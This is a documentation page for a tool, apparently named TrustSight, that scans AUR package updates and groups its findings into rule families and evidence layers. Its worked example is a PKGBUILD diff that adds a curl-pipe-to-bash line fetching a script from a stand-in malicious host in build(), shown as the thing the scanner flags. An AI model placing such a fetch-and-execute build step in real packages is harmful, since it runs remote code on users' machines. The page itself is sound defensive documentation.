<!-- description: How TrustSight groups security evidence: rule families, evidence categories, the layer profile, coverage states, and what a layer label does and does not mean. -->

# How TrustSight groups security evidence

TrustSight uses rules to examine changes to AUR packages. Different rules look
for different warning signs: suspicious commands, changes to package
structure, attempts to hide behaviour, unusual activity relative to a
package's history, and patterns shared by several packages.

Every rule carries three labels. Its **family** (the series letter) says *how it
works*. Its **subject** (category) says *what it looks for*. Its **evidence
category** (layer, `L1`-`L8`, plus the optional `L9` artifact lane) says *what
kind of evidence the finding is*. The
[glossary](reference/glossary.md) defines the whole vocabulary; this section
shows how the labels read in a report.

These labels help you read a report. They are **not** a sequence of security
barriers: a finding at `L4` does not prove an attacker passed through `L1`, `L2`
and `L3`, and a layer with no finding is not proof a package is safe.

## A worked example

You review a package whose update bumps the version, repoints its `source=`
line, and adds a command to `build()`:

```diff
--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,14 +1,15 @@
 pkgname=demo
-pkgver=1.0
+pkgver=1.1
 pkgrel=1
 pkgdesc="Demo package"
 arch=('x86_64')
 url="https://example.invalid"
 license=('MIT')
-source=('https://example.invalid/demo-1.0.tar.gz')
+source=('https://evil.invalid/demo-1.1.tar.gz')
 sha256sums=('SKIP')
 
 build() {
   cd "$srcdir/demo-$pkgver"
+  curl -fsSL https://evil.invalid/x.sh | bash
   make
 }
```

The default report renders the findings and the change summary:

```
demo 1.0 -> 1.1
  Version bump. modified PKGBUILD.
  Signals: Remote Script Execution: curl ... | bash [R001];
    Source URL classified as unknown (https://evil.invalid/demo-1.1.tar.gz);
    Uses curl in PKGBUILD [R010].
  Evidence categories fired: L3 (Payload signature). Review the diff before building.
```

Two findings fired: `R001` (Remote Script Execution) and `R010` (Uses curl in
PKGBUILD). Both are regex checks in the `R` family, so both carry the same
evidence category, `L3` (Payload signature), and the verdict names that one
category. The unknown `source=` domain is a prior, not a rule finding, so it does
not name a layer.

The full layer profile is in the report's `layers` object, one entry per
category:

```
L1  Structural coherence     passed
L2  Readability              passed
L3  Payload signature        fired          (R001, R010)
L4  Evasion shape            passed
L5  Behavioral suspicion     passed
L6  Ecosystem memory         passed
L7  Known indicators         passed
L8  Campaign correlation     not_applicable  (a single package has no cross-package input)
```

Reading it down:

- **`L3 fired`** because two `R` rules matched the new `curl ... | bash` line.
  The label records *which kind of check* produced the finding. It does not mean
  an attacker reached `L3` after passing `L1` and `L2`.
- **`L1 passed`** because the change was read in full and no `C` or `M` rule
  matched. It is not a certificate of safety, only the fact that this category
  was read and stayed silent.
- **`L8 not_applicable`** because a single package has no neighbours to compare
  against; the check could not run at all. This is different from `passed`.

A ninth category sits outside the static profile: **`L9` (artifact reality)**.
It is the optional build lane that inspects a package manifest produced by an
external build (`trustsight verify-build --manifest`), reports artifact rules
`A001`-`A008`, and is never blended into the L1-L8 score. It is absent from the
layer profile unless the lane runs; when it is disabled or no manifest is
supplied, the report carries `l9_unavailable` - a weight-0 boundary, never a
clean or malicious verdict. When the artifact and the static analysis disagree,
both profiles stand and the report carries an explicit `l9_divergence` notice.
See [Artifact](reference/rules/artifact.md) and
[Reporting](assurance-layers/reporting.md).

## Detection and coverage are two facts

The profile keeps two independent dimensions, so a finding never hides that its
category was also unread, and an unread category never hides a finding:

| | coverage `complete` | coverage `incomplete` | coverage `not_applicable` |
|---|---|---|---|
| detection `fired` | found it, and read the whole change | found it, but only part of the change was read | cannot happen |
| detection `none` | read the whole change, nothing matched (**not** a safety certificate) | only part of the change was read, so this silence is not evidence | the check could not run (e.g. `L8` on one package) |

Now suppose the same diff is cut short (a truncated paste). The report adds a
not-vetted note, and `L3`'s coverage flips to `incomplete` while its detection
stays `fired`:

```json
"L3": {"name": "Payload signature", "detection": "fired",
       "coverage": "incomplete", "status": "fired", "findings": ["R001", "R010"]}
```

Finding something and having read everything are two separate facts, and the
report keeps them separate. Content truncation blinds every layer, so the whole
profile shifts to `incomplete` except `L8`, which stays `not_applicable`.

## What the model does not mean

- A layer label is not a claim about how far an attacker progressed.
- A category that did not fire is not proof the package is safe.
- Passing the automated tests verifies the *implementation* of this model; it
  does not prove the detections are diverse or effective against real attacks
  ([Part 4](assurance-layers/enforcement.md)).

## Parts 1 to 4

- **[Part 1: Evidence categories and rule mapping](assurance-layers/evidence-categories.md)** -
  the eight categories, which rule families feed each, and how a rule maps.
- **[Part 2: How to add a useful new detector](assurance-layers/diversity.md)** -
  the intake checklist, shared dependencies, and why complementary is not the
  same as independent.
- **[Part 3: Reporting](assurance-layers/reporting.md)** - the `layers` object,
  its statuses, and the CLI/JSON examples.
- **[Part 4: Tests and adversarial evaluation](assurance-layers/enforcement.md)** -
  what the gates prove, and what the adversarial harness measures.

## See Also

- [Glossary](reference/glossary.md) - family, subject, layer, tier, and the report terms
- [Rule Series](reference/rules/nature.md) - the rule families in full
- [Rules Reference](reference/rules/index.md) - the catalog by category
- [The security model](security.md) - the threat model this section complements
